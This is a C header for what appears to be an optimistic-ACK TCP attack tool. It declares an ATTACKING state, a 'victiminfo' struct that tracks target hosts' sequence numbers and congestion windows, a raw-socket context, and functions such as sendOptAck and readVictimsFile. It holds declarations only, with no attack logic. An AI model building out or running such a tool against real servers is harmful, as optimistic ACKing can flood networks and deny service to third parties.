#ifndef OPTACK_H
#define OPTACK_H

#include <pcap.h>
#include "mindelay.h"

#ifndef u32
typedef unsigned int u32;
#endif

#ifndef u16
typedef unsigned short u16;
#endif
#ifndef u8
typedef unsigned char u8;
#endif

#ifndef BUFLEN
#define BUFLEN	4096
#endif

#ifndef MIN
#define MIN(x,y) ((x)<(y)?(x):(y))
#endif
#ifndef MAX
#define MAX(x,y) ((x)>(y)?(x):(y))
#endif

/************ Constants
 */

#define UNCONNECTED 	0x00
#define SYNSENT		0x01
#define GOTSYNACK	0x05
#define CONNECTED	0x02
#define ATTACKING	0x03
#define RECOVER		0x04

// for Pcap
#define MYSNAPLEN 256
// for lookup Hash
#define HASHBUCKETS 65536
// Defaults
// 	// reasonable wscale
#define WSCALE 	4
	// standard mss
#define MSS	1460
	// Ack 1/3rd  of window
#define EFFICIENCY (1.0/3.0)
	// 50 ms
#define USWAIT	50000
	// same as DSL uplink
#define BANDWIDTH (16*1024)

/*********** Structs
 */
typedef struct victiminfo{
	u32 lastAck;
	u32 lastSegmentReceived;
	u32 localSeq;
	u32 fileStartSeq;
	char * hostStr;
	char * chostStr;
	char * fileStr;
	int fileSize;
	u32 dstIP;
	u16 dstPort;
	u16 srcPort;
	int state;
	int congwindow;	// congestion window, in bytes
	int ssthresh;
	int slowstart;
	struct victiminfo * next;
} victiminfo;

typedef struct context {
	victiminfo **victims;
	int nVictims;
	double efficiency;
	unsigned long minUSPerRound;
	int rawSock;
	u32 localIP;
	char * victimFile;
	pcap_t * pcap_handle;
	long localBandwidth;
	long usDelay;
	int defaultRecvWindow;
	int mss;
	int wscale;
	int shouldStop;
	int dontReconnect;
	char * dev;		// ethernet device to listen on
	victiminfo * lookupHash[HASHBUCKETS];
	pthread_t packetGrabberThread;
} context;

typedef struct pseudohdr {
	/*for computing TCP checksum, see TCP/IP Illustrated p. 145 */
	u32 s_addr;
	u32 d_addr;
	u8 zero;
	u8 proto;
	u16 length;
} pseudohdr;


extern context * ctx;

/******** Protos
 */
context * parseArgs(int, char **);
context * defaultContext();
int readVictimsFile(context *);
void init(context *);
int optack(context *);
pcap_t * init_pcap(context *);
unsigned short in_cksum(u16 *ptr,int nbytes);
int sendSyn(context *, victiminfo *);
int sendOptAck(context *, victiminfo *);
int sendRecoverAck(context *, victiminfo *);
int sendAck(context *, victiminfo *);
int myWaitUntil(struct timeval, long usDelay);
int sendAppGet(context *ctx, victiminfo *v);
void * packetGrabber(void *);
void pcap_packetgrabber(u_char *, const struct pcap_pkthdr *, const u_char *);
void usage(char *, char*);
victiminfo * lookupVictim(context * ctx,u32 srcIP, u32 dstIP,u16 srcPort, u16 dstPort);
int addToLookupHash(context *ctx, victiminfo *v);
int delFromLookupHash(context *ctx, victiminfo *v);
inline int lookupVictimHash(context * ctx,u32 srcIP, u32 dstIP,u16 srcPort, u16 dstPort);
unsigned int getLocalIP();
int parseVictimLine(context * ctx,victiminfo * v,char *line,int len);





#endif
